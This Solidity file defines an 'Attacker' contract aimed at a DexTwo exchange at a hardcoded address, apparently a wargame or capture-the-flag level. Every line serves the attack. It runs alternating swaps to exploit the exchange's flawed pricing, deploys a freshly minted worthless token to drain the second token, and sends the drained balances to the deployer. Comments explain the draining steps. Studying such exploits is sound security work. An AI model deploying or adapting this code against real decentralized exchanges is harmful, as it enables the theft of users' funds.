// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;
import "./ContractTwo.sol";
import "./NewAttackToken.sol";

contract Attacker {
    DexTwo dex = DexTwo(0x88d6cdfC4388d080099cBF8dA3032F29D7BDE187);
    address token1;
    address token2;
    address owner;

    constructor() public {
        token1 = dex.token1();
        token2 = dex.token2();
        owner = msg.sender;
    }

    function attack() public {
        dex.approve( address(dex), 1000);

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);

        //token 2 bal in dex is 90 at this point, 
        //to drain this, we must do the same thing as above, 
        //but with a new token added to the mix
        //we must deploy a new token and mint 100 to the dex
        //send 10 token2 back to dex so the token2 bal can be 100


        //send tokens to dex
        IERC20(token2).transfer(address(dex), 10 );
        NewAttackToken attackToken = new NewAttackToken(address(dex));

        require( attackToken.balanceOf(address(dex)) == 100, 'ATTACKER: no attack tokens');
        IERC20(attackToken).approve( address(dex), 1000);

        dex.swap(token2,  address(attackToken), 10);
        dex.swap( address(attackToken), token2, 20);
        dex.swap(token2,  address(attackToken), 24);
        dex.swap( address(attackToken), token2, 30);
        dex.swap(token2,  address(attackToken), 41);
        dex.swap( address(attackToken), token2, 45);

        //send tokens to owner
        IERC20(token1).transfer(owner, IERC20(token1).balanceOf(address(this)) );
        IERC20(token2).transfer(owner, IERC20(token2).balanceOf(address(this)) );
    }
}
